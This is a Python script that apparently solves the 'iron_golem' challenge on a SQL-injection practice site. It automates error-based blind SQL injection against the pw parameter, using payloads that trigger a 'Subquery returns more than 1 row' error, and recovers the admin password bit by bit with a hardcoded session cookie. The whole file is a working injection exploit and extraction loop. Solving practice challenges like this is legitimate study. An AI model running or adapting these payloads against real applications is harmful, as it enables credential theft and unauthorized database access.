import requests


def blindi():
	password=""
	cookies={"PHPSESSID":"2jmdje149iheon8es94327lllt"}
	full_length=0
	'''
	index=0
	while 1:
		print("length : " + str(index))
		URL="https://los.rubiya.kr/chall/iron_golem_beb244fe41dd33998ef7bb4211c56c75.php?pw=' or id=char(97,100,109,105,110) and if(length(pw)="+str(index)+", (SELECT 1 UNION SELECT 2), True) ;%00"
		response = requests.get(URL, cookies=cookies)
		if "Subquery returns more than 1 row" in response.text:
			full_length=index
			print("full length : %s" % (str(full_length)))
			break
		index+=1

	word_length=0
	index=0
	while 1:
		print("length : " + str(index))
		URL="https://los.rubiya.kr/chall/iron_golem_beb244fe41dd33998ef7bb4211c56c75.php?pw=' or id=char(97,100,109,105,110) and if(length(substr(pw,1,1))="+str(index)+", (SELECT 1 UNION SELECT 2), True) ;%00"
		response = requests.get(URL, cookies=cookies)
		if "Subquery returns more than 1 row" in response.text:
			word_length=index
			print("word length : %s" % (str(word_length)))
			break
		index+=1
	'''
	#loop_count= int(full_length/word_length)
	#skip length loop
	loop_count=32
	#
	# binary version
	for i in range(1,loop_count+1):
		print("progress : " + str(i))
		word=""
		for j in range(1, 9):
			URL="https://los.rubiya.kr/chall/iron_golem_beb244fe41dd33998ef7bb4211c56c75.php?pw=' or id=char(97,100,109,105,110) and if(substr(lpad(bin(ord(substr(pw,"+str(i)+",1))),8,'0'),"+str(j)+",1)=1, (SELECT 1 UNION SELECT 2), True) ;%00"
			response = requests.get(URL, cookies=cookies)
			if "Subquery returns more than 1 row" in response.text:
				
				word+=str(1)	
			else:
				word+=str(0)
			print("currnet word : "+str(word))
		password+=chr(int(word,2))
		print("current password : " + password)

	print("admin's Password : " + password)
	
if __name__ == "__main__":
	print("Start Program")
	blindi()
